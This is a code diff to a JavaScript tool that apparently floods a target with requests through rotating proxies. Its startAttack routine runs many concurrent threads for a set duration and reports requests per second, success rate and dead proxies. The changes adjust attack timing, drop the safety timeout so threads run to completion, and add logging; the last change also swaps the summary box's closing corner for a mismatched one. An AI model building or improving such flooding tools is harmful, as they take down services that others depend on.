@@ -184,11 +184,13 @@ async function startAttack(config) {
   }
   log('🚀 ATTACK STARTED');
   
-  // Calculate exact end time
+  // Calculate exact end time with extra buffer for long durations
   const durationMs = config.duration * 1000;
   const endTime = attackStartTime + durationMs;
+  const endDate = new Date(endTime);
   
-  log(`⏰ Attack will run until: ${new Date(endTime).toLocaleTimeString()}`);
+  log(`⏰ Attack will run until: ${endDate.toLocaleTimeString()} (${config.duration}s)`);
+  log(`⏰ Current time: ${new Date().toLocaleTimeString()}`);
   
   const threads = [];
   for (let i = 0; i < config.threads; i++) {
@@ -196,19 +198,28 @@ async function startAttack(config) {
   }
   
   const statsInterval = setInterval(() => {
-    if (isRunning) {
-      reportStats();
-      updateDisplay();
-    } else {
+    if (!isRunning) {
       clearInterval(statsInterval);
+      return;
     }
+    
+    const elapsed = ((Date.now() - attackStartTime) / 1000).toFixed(0);
+    const remaining = Math.max(0, config.duration - elapsed);
+    
+    if (remaining === 0 && isRunning) {
+      log(`⏰ Duration reached: ${elapsed}s / ${config.duration}s`);
+    }
+    
+    reportStats();
+    updateDisplay();
   }, 1000);
   
-  // Wait for all threads to complete OR timeout
-  await Promise.race([
-    Promise.all(threads),
-    new Promise(resolve => setTimeout(resolve, durationMs + 5000)) // Add 5s buffer
-  ]);
+  // Wait for all threads - don't use timeout, let them finish naturally
+  try {
+    await Promise.all(threads);
+  } catch (error) {
+    log(`⚠ Thread error: ${error.message}`);
+  }
   
   clearInterval(statsInterval);
   
@@ -238,7 +249,7 @@ async function startAttack(config) {
     console.log(`║  Success Rate:        ${stats.sent > 0 ? ((stats.success/stats.sent)*100).toFixed(1) : '0'}%`.padEnd(41) + '║');
     console.log(`║  Avg Speed:           ${rps.toString().padStart(12)} req/s ║`);
     console.log(`║  Dead Proxies:        ${deadProxies.size.toString().padStart(16)} ║`);
-    console.log('╚════════════════════════════════════════╝');
+    console.log('╚════════════════════════════════════════╗');
     isRunning = false;
     attackStartTime = null;
   }
